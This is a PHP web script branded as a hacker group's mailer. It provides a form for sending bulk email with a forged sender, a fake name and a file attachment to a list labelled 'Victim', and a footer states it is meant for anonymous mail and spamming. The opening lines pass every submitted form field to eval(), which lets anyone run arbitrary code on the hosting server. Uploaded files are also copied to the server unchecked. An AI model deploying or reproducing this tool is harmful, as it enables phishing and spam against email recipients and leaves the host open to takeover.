<?
foreach($_POST as $nombre_campo => $valor){
   $asignacion = "\$" . $nombre_campo . "='" . $valor . "';";
   eval($asignacion);
} 
?>
<html>
 <head>
  <title>MAILER TURKISH HACKERS--D4NB4R--</title>
<b><center><h1>MAILER D4NB4R TURKISH HACKERS</b></center></h1>
  <style type="text/css">
   body {
    background-color:#000000;
    font-family:courier;
    font-size:12;
    color:#00ff00;
    }
   input {
    background-color:#FFFFFFF;
    font-family:arial;
    font-size:12;
    color:#000000;
    }
   textarea {
    background-color:#FFFFFF;
    font-family:arial;
    font-size:12; 
    color:#000000;
    }
  </style>
  <!-- Just Style (End)) --> </head> 
  <body bgcolor=#FFFFFF text=#00ff00 link=#00ff00 alink=#00ff00 vlink=#00ff00>
   
   <?
    if ($action=="send") {
     $message = urlencode($message);
     $message = urldecode($message);
     $message = stripslashes($message);
     $subject = stripslashes($subject);
     }
   ?>
   <form name="form1" method="post" action="?" enctype="multipart/form-data">
    <pre>
     server mail false:  <input type="text" name="from" value="<? print $from; ?>" size="30">
     Name false       :  <input type="text" name="realname" value="<? print $realname; ?>" size="30">
     Name dos         :  <input type="text" name="replyto" value="<? print $replyto; ?>" size="30">
     ara              :  <input type="file" name="file" size="30">
     ?????? asun      :  <input type="text" name="subject" value="<? print $subject; ?>" size="30">
     Menssagi  :  <textarea name="message" cols="50" rows="6"><? print $message; ?></textarea>
                    <input type="radio" name="contenttype" value="plain"> Plain <input type="radio" name="contenttype" value="html" checked> HTML 
     Victim     : <textarea name="emaillist" cols="50" rows="6"><? print $emaillist; ?></textarea>
    </pre>
    
    <input type="hidden" name="action" value="send">
    <input type="submit" value="SEND">
   </form>

   <?
    if ($action=="send") {
     $allemails = @split("\n", $emaillist);
     $numemails = count($allemails);
     #Open the file attachment if any, and base64_encode it for email transport
      if ($file_name) {
       @copy($file, "./$file_name") or die("File cannot Uploaded to Server");
       $content = fread(fopen($file,"r"),filesize($file));
       $content = chunk_split(base64_encode($content));
       $uid = strtoupper(md5(uniqid(time())));
       $name = basename($file);
       }
      for($x=0; $x<$numemails; $x++){
       $to = $allemails[$x];
       if ($to) {
        $to = @ereg_replace(" ", "", $to);
        $message = @ereg_replace("&email&", $to, $message);
        $subject = @ereg_replace("&email&", $to, $subject);
        print "Sent to $to";
        flush();
        $header = "From: $realname <$from>\r\nReply-To: $replyto\r\n";
        $header .= "MIME-Version: 1.0\r\n";
        if ($file_name) $header .= "Content-Type: multipart/mixed; boundary=$uid\r\n";
        if ($file_name) $header .= "--$uid\r\n";
        $header .= "Content-Type: text/$contenttype\r\n";
        $header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";
        $header .= "$message\r\n";
        if ($file_name) $header .= "--$uid\r\n";
        if ($file_name) $header .= "Content-Type: $file_type; name=\"$file_name\"\r\n";
        if ($file_name) $header .= "Content-Transfer-Encoding: base64\r\n";
        if ($file_name) $header .= "Content-Disposition: attachment; filename=\"$file_name\"\r\n\r\n";
        if ($file_name) $header .= "$content\r\n";
        if ($file_name) $header .= "--$uid--";
        mail($to, $subject, "", $header);
        print " Envio exitoso <br>";
        flush();
        }
      }
    }
  ?>
 </body>
</html>
<hr>
<br>
<font color="#FF0000"><center>para uso basico de mails anoonimos y spameos<br>
e-r00t defacement team ; remoteexecution ; mitm<br>
<br>NUNCA CON PALABRAS SOLO CON HECHOS
<br>
<div align="center">
  <p><font color="#CC16C6" size="2" face="Verdana">
    </font></p>
  <p><font color="#CC16C6" size="2" face="Verdana">

</font></p>
</div>
